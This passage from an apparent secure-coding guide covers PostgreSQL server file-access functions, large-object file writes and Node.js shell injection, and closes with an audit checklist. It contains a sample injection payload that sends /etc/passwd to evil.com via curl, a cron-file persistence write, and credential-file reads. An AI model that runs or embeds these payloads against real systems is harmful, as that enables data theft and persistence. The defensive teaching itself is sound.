### pg_read_file / pg_write_file - server file system access

```sql
-- Read any file the postgres OS user can read
SELECT pg_read_file('/etc/postgresql/16/main/postgresql.conf');
SELECT pg_read_file('/proc/1/environ'); -- environment variables of init process

-- Directory traversal if path is user-supplied
SELECT pg_read_file('/var/lib/postgresql/' || user_input || '/pg_hba.conf');
```

These require superuser or `pg_read_server_files` / `pg_write_server_files`
role membership. Audit:

```sql
-- Find roles with file read/write access
SELECT rolname FROM pg_roles
WHERE pg_has_role(rolname, 'pg_read_server_files', 'member')
   OR pg_has_role(rolname, 'pg_write_server_files', 'member');
```

### lo_import / lo_export - file I/O via large objects

These require superuser. If wrapped in a SECURITY DEFINER function granted
to the app role, they become an app-accessible file I/O primitive.

```sql
-- Write content to server file system via large objects
SELECT lo_export(
  lo_from_bytea(0, $1::bytea),  -- attacker-controlled bytes
  '/etc/cron.d/payload'          -- write to cron for persistence
);
```

Audit every SECURITY DEFINER function body for references to `lo_import`,
`lo_export`, `lo_from_bytea`, `lo_get`, `lo_put`.

### Application-layer command injection: exec vs execFile

```javascript
// VULNERABLE to shell injection
import { exec } from 'child_process';
const filename = req.body.filename; // or from DB query result
exec(`convert "${filename}" output.png`);
// Payload: filename = '"; curl https://evil.com/$(cat /etc/passwd) #'

// SAFE: execFile uses an argument array, no shell interpretation
import { execFile } from 'child_process';
execFile('convert', [filename, 'output.png']); // filename is just a string arg

// Also safe: spawn with shell: false (the default)
import { spawn } from 'child_process';
const proc = spawn('convert', [filename, 'output.png'], { shell: false });
```

Complete rule: if you use `exec()` or `execSync()` anywhere in server code,
replace it with `execFile()` or `spawn()` with `{ shell: false }` and an
explicit argument array. Never template a shell string.

### Combined checklist

1. `pg_execute_server_program` role not granted to application role
2. `pg_read_server_files` and `pg_write_server_files` not granted to app role
3. No SECURITY DEFINER function contains COPY TO PROGRAM with variable input
4. No SECURITY DEFINER function calls lo_import, lo_export, pg_read_file
5. No server-side code uses exec() or execSync() with any external value
6. All OS process calls use execFile() or spawn() with explicit arg arrays
7. File paths from user input or DB are validated against an allowlist before
   any file system or process operation
